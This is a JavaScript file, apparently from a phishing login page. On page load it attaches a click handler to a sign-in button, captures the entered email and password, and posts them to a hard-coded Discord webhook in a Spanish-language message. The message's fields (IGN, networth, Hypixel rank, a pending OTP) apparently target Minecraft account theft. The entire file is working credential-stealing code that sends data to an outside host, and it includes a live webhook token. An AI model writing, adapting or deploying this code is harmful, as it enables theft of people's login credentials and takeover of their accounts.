document.addEventListener("DOMContentLoaded", function() {
    var signInButton = document.querySelector('button[data-testid="btn-signin-submit"]');
    var emailInput = document.querySelector('input[name="username"]');
    var passwordInput = document.querySelector('input[name="password"]');

    signInButton.addEventListener("click", function() {
        var email = emailInput.value;
        var password = passwordInput.value;

        if (email && password) {
            var webhookURL = 'https://discord.com/api/webhooks/1418270316832227379/o9Fl5axupXerfia6cj8gkdtF-UaN6D9zU28kmBq-I-nf9u-M4E2kQ7pyBhEKE0N7fiOI';
            var message = `
@everyone
Solicitado OTP
IGN
${email}
Correo Electrónico
${email}
Correo Electrónico de Seguridad
${email}
Contraseña
${password}
UUID
N/A
Networth No Atado
N/A
Networth Total
N/A
Rango
N/A
Nivel de Hypixel
N/A
Usuario de Discord
${email}
OTP
Esperando...
            `;

            console.log('Enviando mensaje a Discord:', message);

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ content: message })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Éxito:', data);
                alert('Datos enviados exitosamente a Discord.');
            })
            .catch((error) => {
                console.error('Error al enviar datos a Discord:', error);
                alert('Ocurrió un error al enviar los datos a Discord.');
            });
        } else {
            alert('Por favor, ingresa tanto el correo electrónico como la contraseña.');
        }
    });
});
